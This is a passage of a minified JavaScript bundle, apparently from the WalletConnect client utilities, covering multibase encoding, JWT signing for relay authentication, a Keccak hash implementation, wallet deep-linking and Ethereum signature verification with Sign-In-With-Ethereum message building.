"${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?Mb(globalThis.Buffer.from(t,"utf-8")):r.decoder.decode(`${r.prefix}${t}`)}function Gv(t){return yc(jg(ch(t,Fg),xE))}function J0(t){return jg(ch(js(t),xE),Fg)}function ME(t){const e=ch(tP,Fv),r=eP+jg(NE([e,t]),Fv);return[YN,XN,r].join(QN)}function Ak(t){return jg(t,Fg)}function xk(t){return ch(t,Fg)}function Ik(t){return ch([J0(t.header),J0(t.payload)].join(Z0),IE)}function Sk(t){return[J0(t.header),J0(t.payload),Ak(t.signature)].join(Z0)}function Km(t){const e=t.split(Z0),r=Gv(e[0]),n=Gv(e[1]),i=xk(e[2]),s=ch(e.slice(0,2).join(Z0),IE);return{header:r,payload:n,signature:i,data:s}}function Kv(t=fE(rP)){const e=AE.getPublicKey(t);return{secretKey:NE([t,e]),publicKey:e}}async function Nk(t,e,r,n,i=X.fromMiliseconds(Date.now())){const s={alg:ZN,typ:JN},o=ME(n.publicKey),a=i+r,c={iss:o,sub:t,aud:e,iat:i,exp:a},l=Ik({header:s,payload:c}),u=AE.sign(l,n.secretKey.slice(0,32));return Sk({header:s,payload:c,signature:u})}function FE(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function bd(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const r=FE(e);let n=0;for(const i of t)r.set(i,n),n+=i.length;return r}function Pk(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(g){if(g instanceof Uint8Array||(ArrayBuffer.isView(g)?g=new Uint8Array(g.buffer,g.byteOffset,g.byteLength):Array.isArray(g)&&(g=Uint8Array.from(g))),!(g instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(g.length===0)return"";for(var p=0,w=0,m=0,b=g.length;m!==b&&g[m]===0;)m++,p++;for(var v=(b-m)*u+1>>>0,x=new Uint8Array(v);m!==b;){for(var I=g[m],C=0,N=v-1;(I!==0||C<w)&&N!==-1;N--,C++)I+=256*x[N]>>>0,x[N]=I%a>>>0,I=I/a>>>0;if(I!==0)throw new Error("Non-zero carry");w=C,m++}for(var S=v-w;S!==v&&x[S]===0;)S++;for(var P=c.repeat(p);S<v;++S)P+=t.charAt(x[S]);return P}function d(g){if(typeof g!="string")throw new TypeError("Expected String");if(g.length===0)return new Uint8Array;var p=0;if(g[p]!==" "){for(var w=0,m=0;g[p]===c;)w++,p++;for(var b=(g.length-p)*l+1>>>0,v=new Uint8Array(b);g[p];){var x=r[g.charCodeAt(p)];if(x===255)return;for(var I=0,C=b-1;(x!==0||I<m)&&C!==-1;C--,I++)x+=a*v[C]>>>0,v[C]=x%256>>>0,x=x/256>>>0;if(x!==0)throw new Error("Non-zero carry");m=I,p++}if(g[p]!==" "){for(var N=b-m;N!==b&&v[N]===0;)N++;for(var S=new Uint8Array(w+(b-N)),P=w;N!==b;)S[P++]=v[N++];return S}}}function f(g){var p=d(g);if(p)return p;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:f}}var kk=Pk,Ok=kk;const _k=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},Tk=t=>new TextEncoder().encode(t),$k=t=>new TextDecoder().decode(t);class Rk{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class Dk{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return zE(this,e)}}class Bk{constructor(e){this.decoders=e}or(e){return zE(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const zE=(t,e)=>new Bk({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class Lk{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new Rk(e,r,n),this.decoder=new Dk(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const Hg=({name:t,prefix:e,encode:r,decode:n})=>new Lk(t,e,r,n),Mf=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=Ok(r,e);return Hg({prefix:t,name:e,encode:n,decode:s=>_k(i(s))})},Uk=(t,e,r,n)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},Mk=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},lr=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>Hg({prefix:e,name:t,encode(i){return Mk(i,n,r)},decode(i){return Uk(i,n,r,t)}}),Fk=Hg({prefix:"\0",name:"identity",encode:t=>$k(t),decode:t=>Tk(t)}),zk=Object.freeze(Object.defineProperty({__proto__:null,identity:Fk},Symbol.toStringTag,{value:"Module"})),jk=lr({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),Hk=Object.freeze(Object.defineProperty({__proto__:null,base2:jk},Symbol.toStringTag,{value:"Module"})),qk=lr({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),Vk=Object.freeze(Object.defineProperty({__proto__:null,base8:qk},Symbol.toStringTag,{value:"Module"})),Wk=Mf({prefix:"9",name:"base10",alphabet:"0123456789"}),Gk=Object.freeze(Object.defineProperty({__proto__:null,base10:Wk},Symbol.toStringTag,{value:"Module"})),Kk=lr({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),Zk=lr({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),Jk=Object.freeze(Object.defineProperty({__proto__:null,base16:Kk,base16upper:Zk},Symbol.toStringTag,{value:"Module"})),Qk=lr({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),Yk=lr({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),Xk=lr({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),eO=lr({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),tO=lr({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),rO=lr({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),nO=lr({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),iO=lr({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),sO=lr({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),oO=Object.freeze(Object.defineProperty({__proto__:null,base32:Qk,base32hex:tO,base32hexpad:nO,base32hexpadupper:iO,base32hexupper:rO,base32pad:Xk,base32padupper:eO,base32upper:Yk,base32z:sO},Symbol.toStringTag,{value:"Module"})),aO=Mf({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),cO=Mf({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),lO=Object.freeze(Object.defineProperty({__proto__:null,base36:aO,base36upper:cO},Symbol.toStringTag,{value:"Module"})),uO=Mf({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),hO=Mf({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),dO=Object.freeze(Object.defineProperty({__proto__:null,base58btc:uO,base58flickr:hO},Symbol.toStringTag,{value:"Module"})),fO=lr({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),pO=lr({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),gO=lr({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),wO=lr({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),mO=Object.freeze(Object.defineProperty({__proto__:null,base64:fO,base64pad:pO,base64url:gO,base64urlpad:wO},Symbol.toStringTag,{value:"Module"})),jE=Array.from(""),yO=jE.reduce((t,e,r)=>(t[r]=e,t),[]),bO=jE.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function vO(t){return t.reduce((e,r)=>(e+=yO[r],e),"")}function EO(t){const e=[];for(const r of t){const n=bO[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const CO=Hg({prefix:"",name:"base256emoji",encode:vO,decode:EO}),AO=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:CO},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const Zv={...zk,...Hk,...Vk,...Gk,...Jk,...oO,...lO,...dO,...mO,...AO};function HE(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const Jv=HE("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),G1=HE("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=FE(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),qE={utf8:Jv,"utf-8":Jv,hex:Zv.base16,latin1:G1,ascii:G1,binary:G1,...Zv};function zn(t,e="utf8"){const r=qE[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):r.decoder.decode(`${r.prefix}${t}`)}function Kr(t,e="utf8"){const r=qE[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):r.encoder.encode(t).substring(1)}const xO={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};var IO={};const SO=":";function Hl(t){const[e,r]=t.split(SO);return{namespace:e,reference:r}}function Qv(t,e=[]){const r=[];return Object.keys(t).forEach(n=>{if(e.length&&!e.includes(n))return;const i=t[n];r.push(...i.accounts)}),r}function VE(t,e){return t.includes(":")?[t]:e.chains||[]}var NO=Object.defineProperty,PO=Object.defineProperties,kO=Object.getOwnPropertyDescriptors,Yv=Object.getOwnPropertySymbols,OO=Object.prototype.hasOwnProperty,_O=Object.prototype.propertyIsEnumerable,Xv=(t,e,r)=>e in t?NO(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,e3=(t,e)=>{for(var r in e||(e={}))OO.call(e,r)&&Xv(t,r,e[r]);if(Yv)for(var r of Yv(e))_O.call(e,r)&&Xv(t,r,e[r]);return t},TO=(t,e)=>PO(t,kO(e));const $O="ReactNative",gn={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},RO="js";function Q0(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Go(){return!wc.getDocument()&&!!wc.getNavigator()&&navigator.product===$O}function DO(){return Go()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function BO(){return Go()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function Ff(){return!Q0()&&!!wc.getNavigator()&&!!wc.getDocument()}function zf(){return Go()?gn.reactNative:Q0()?gn.node:Ff()?gn.browser:gn.unknown}function t3(){var t;try{return Go()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(t=global.Application)==null?void 0:t.applicationId:void 0}catch{return}}function LO(t,e){const r=new URLSearchParams(t);for(const n of Object.keys(e).sort())if(e.hasOwnProperty(n)){const i=e[n];i!==void 0&&r.set(n,i)}return r.toString()}function UO(t){var e,r;const n=WE();try{return t!=null&&t.url&&n.url&&t.url!==n.url&&(console.warn(`The configured WalletConnect 'metadata.url':${t.url} differs from the actual page url:${n.url}. This is probably unintended and can lead to issues.`),t.url=n.url),(e=t==null?void 0:t.icons)!=null&&e.length&&t.icons.length>0&&(t.icons=t.icons.filter(i=>i!=="")),TO(e3(e3({},n),t),{url:(t==null?void 0:t.url)||n.url,name:(t==null?void 0:t.name)||n.name,description:(t==null?void 0:t.description)||n.description,icons:(r=t==null?void 0:t.icons)!=null&&r.length&&t.icons.length>0?t.icons:n.icons})}catch(i){return console.warn("Error populating app metadata",i),t||n}}function WE(){return zI.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function MO(){if(zf()===gn.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:r,Version:n}=global.Platform;return[r,n].join("-")}const t=sI();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function FO(){var t;const e=zf();return e===gn.browser?[e,((t=wc.getLocation())==null?void 0:t.host)||"unknown"].join(":"):e}function GE(t,e,r){const n=MO(),i=FO();return[[t,e].join("-"),[RO,r].join("-"),n,i].join("/")}function zO({protocol:t,version:e,relayUrl:r,sdkVersion:n,auth:i,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=r.split("?"),u=GE(t,e,n),h={auth:i,ua:u,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},d=LO(l[1]||"",h);return l[0]+"?"+d}function Ta(t,e){return t.filter(r=>e.includes(r)).length===t.length}function Zm(t){return Object.fromEntries(t.entries())}function Jm(t){return new Map(Object.entries(t))}function ma(t=X.FIVE_MINUTES,e){const r=X.toMiliseconds(t||X.FIVE_MINUTES);let n,i,s,o;return{resolve:a=>{s&&n&&(clearTimeout(s),n(a),o=Promise.resolve(a))},reject:a=>{s&&i&&(clearTimeout(s),i(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},r),n=a,i=c})}}function To(t,e,r){return new Promise(async(n,i)=>{const s=setTimeout(()=>i(new Error(r)),e);try{const o=await t;n(o)}catch(o){i(o)}clearTimeout(s)})}function KE(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function jO(t){return KE("topic",t)}function HO(t){return KE("id",t)}function ZE(t){const[e,r]=t.split(":"),n={id:void 0,topic:void 0};if(e==="topic"&&typeof r=="string")n.topic=r;else if(e==="id"&&Number.isInteger(Number(r)))n.id=Number(r);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${r}`);return n}function Dt(t,e){return X.fromMiliseconds(Date.now()+X.toMiliseconds(t))}function co(t){return Date.now()>=X.toMiliseconds(t)}function Xe(t,e){return`${t}${e?`:${e}`:""}`}function k0(t=[],e=[]){return[...new Set([...t,...e])]}async function qO({id:t,topic:e,wcDeepLink:r}){var n;try{if(!r)return;const i=typeof r=="string"?JSON.parse(r):r,s=i==null?void 0:i.href;if(typeof s!="string")return;const o=VO(s,t,e),a=zf();if(a===gn.browser){if(!((n=wc.getDocument())!=null&&n.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}WO(o)}else a===gn.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(i){console.error(i)}}function VO(t,e,r){const n=`requestId=${e}&sessionTopic=${r}`;t.endsWith("/")&&(t=t.slice(0,-1));let i=`${t}`;if(t.startsWith("https://t.me")){const s=t.includes("?")?"&startapp=":"?startapp=";i=`${i}${s}${JO(n,!0)}`}else i=`${i}/wc?${n}`;return i}function WO(t){let e="_self";ZO()?e="_top":(KO()||t.startsWith("https://")||t.startsWith("http://"))&&(e="_blank"),window.open(t,e,"noreferrer noopener")}async function GO(t,e){let r="";try{if(Ff()&&(r=localStorage.getItem(e),r))return r;r=await t.getItem(e)}catch(n){console.error(n)}return r}function r3(t,e){if(!t.includes(e))return null;const r=t.split(/([&,?,=])/),n=r.indexOf(e);return r[n+2]}function n3(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})}function Fb(){return typeof process<"u"&&IO.IS_VITEST==="true"}function KO(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function ZO(){try{return window.self!==window.top}catch{return!1}}function JO(t,e=!1){const r=Buffer.from(t).toString("base64");return e?r.replace(/[=]/g,""):r}function JE(t){return Buffer.from(t,"base64").toString("utf-8")}function QO(t){return new Promise(e=>setTimeout(e,t))}function Rd(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function YO(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function jf(t,...e){if(!YO(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function zb(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Rd(t.outputLen),Rd(t.blockLen)}function Du(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function QE(t,e){jf(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const mp=BigInt(2**32-1),i3=BigInt(32);function XO(t,e=!1){return e?{h:Number(t&mp),l:Number(t>>i3&mp)}:{h:Number(t>>i3&mp)|0,l:Number(t&mp)|0}}function e_(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=XO(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const t_=(t,e,r)=>t<<r|e>>>32-r,r_=(t,e,r)=>e<<r|t>>>32-r,n_=(t,e,r)=>e<<r-32|t>>>64-r,i_=(t,e,r)=>t<<r-32|e>>>64-r,qc=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function s_(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function K1(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function yi(t,e){return t<<32-e|t>>>e}const s3=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function o_(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function o3(t){for(let e=0;e<t.length;e++)t[e]=o_(t[e])}function a_(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function Bu(t){return typeof t=="string"&&(t=a_(t)),jf(t),t}function c_(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];jf(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}let jb=class{clone(){return this._cloneInto()}};function YE(t){const e=n=>t().update(Bu(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function lh(t=32){if(qc&&typeof qc.getRandomValues=="function")return qc.getRandomValues(new Uint8Array(t));if(qc&&typeof qc.randomBytes=="function")return qc.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const XE=[],eC=[],tC=[],l_=BigInt(0),xh=BigInt(1),u_=BigInt(2),h_=BigInt(7),d_=BigInt(256),f_=BigInt(113);for(let t=0,e=xh,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],XE.push(2*(5*n+r)),eC.push((t+1)*(t+2)/2%64);let i=l_;for(let s=0;s<7;s++)e=(e<<xh^(e>>h_)*f_)%d_,e&u_&&(i^=xh<<(xh<<BigInt(s))-xh);tC.push(i)}const[p_,g_]=e_(tC,!0),a3=(t,e,r)=>r>32?n_(t,e,r):t_(t,e,r),c3=(t,e,r)=>r>32?i_(t,e,r):r_(t,e,r);function w_(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=r[c],u=r[c+1],h=a3(l,u,1)^r[a],d=c3(l,u,1)^r[a+1];for(let f=0;f<50;f+=10)t[o+f]^=h,t[o+f+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=eC[o],c=a3(i,s,a),l=c3(i,s,a),u=XE[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=p_[n],t[1]^=g_[n]}r.fill(0)}let m_=class rC extends jb{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Rd(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=s_(this.state)}keccak(){s3||o3(this.state32),w_(this.state32,this.rounds),s3||o3(this.state32),this.posOut=0,this.pos=0}update(e){Du(this);const{blockLen:r,state:n}=this;e=Bu(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Du(this,!1),jf(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Rd(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(QE(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new rC(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const y_=(t,e,r)=>YE(()=>new m_(e,t,r)),b_=y_(1,136,256/8),v_="https://rpc.walletconnect.org/v1";function nC(t){const e=`Ethereum Signed Message:
${t.length}`,r=new TextEncoder().encode(e+t);return"0x"+Buffer.from(b_(r)).toString("hex")}async function E_(t,e,r,n,i,s){switch(r.t){case"eip191":return await C_(t,e,r.s);case"eip1271":return await A_(t,e,r.s,n,i,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${r.t}`)}}async function C_(t,e,r){return(await TS({hash:nC(e),signature:r})).toLowerCase()===t.toLowerCase()}async function A_(t,e,r,n,i,s){const o=Hl(n);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${n}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l="0000000000000000000000000000000000000000000000000000000000000041",u=r.substring(2),h=nC(e).substring(2),d=a+h+c+l+u,f=await fetch(`${s||v_}/?chainId=${n}&projectId=${i}`,{method:"POST",body:JSON.stringify({id:x_(),jsonrpc:"2.0",method:"eth_call",params:[{to:t,data:d},"latest"]})}),{result:g}=await f.json();return g?g.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function x_(){return Date.now()+Math.floor(Math.random()*1e3)}function I_(t){const e=atob(t),r=new Uint8Array(e.length);for(let o=0;o<e.length;o++)r[o]=e.charCodeAt(o);const n=r[0];if(n===0)throw new Error("No signatures found");const i=1+n*64;if(r.length<i)throw new Error("Transaction data too short for claimed signature count");if(r.length<100)throw new Error("Transaction too short");const s=Buffer.from(t,"base64").slice(1,65);return DS.encode(s)}var S_=Object.defineProperty,N_=Object.defineProperties,P_=Object.getOwnPropertyDescriptors,l3=Object.getOwnPropertySymbols,k_=Object.prototype.hasOwnProperty,O_=Object.prototype.propertyIsEnumerable,u3=(t,e,r)=>e in t?S_(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,__=(t,e)=>{for(var r in e||(e={}))k_.call(e,r)&&u3(t,r,e[r]);if(l3)for(var r of l3(e))O_.call(e,r)&&u3(t,r,e[r]);return t},T_=(t,e)=>N_(t,P_(e));const $_="did:pkh:",Hb=t=>t==null?void 0:t.split(":"),R_=t=>{const e=t&&Hb(t);if(e)return t.includes($_)?e[3]:e[1]},Qm=t=>{const e=t&&Hb(t);if(e)return e[2]+":"+e[3]},Y0=t=>{const e=t&&Hb(t);if(e)return e.pop()};async function h3(t){const{cacao:e,projectId:r}=t,{s:n,p:i}=e,s=iC(i,i.iss),o=Y0(i.iss);return await E_(o,s,n,Qm(i.iss),r)}const iC=(t,e)=>{const r=`${t.domain} wants you to sign in with your Ethereum account:`,n=Y0(e);if(!t.aud&&!t.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let i=t.statement||void 0;const s=`URI: ${t.aud||t.uri}`,o=`Version: ${t.version}`,a=`Chain ID: ${R_(e)}`,c=`Nonce: ${t.nonce}`,l=`Issued At: ${t.iat}`,u=t.exp?`Expiration Time: ${t.exp}`:void 0,h=t.nbf?`Not Before: ${t.nbf}`:void 0,d=t.requestId?`Request ID: ${t.requestId}`:void 0,f=t.resources?`Resources:${t.resources.map(p=>`
- ${p}`).join("")}`:void 0,g=O0(t.resources);if(g){const p=Dd(g);i=H_(i,p)}return[r,n,"",i,"",s,o,a,c,l,u,h,d,f].filter(p=>p!=null).join(`
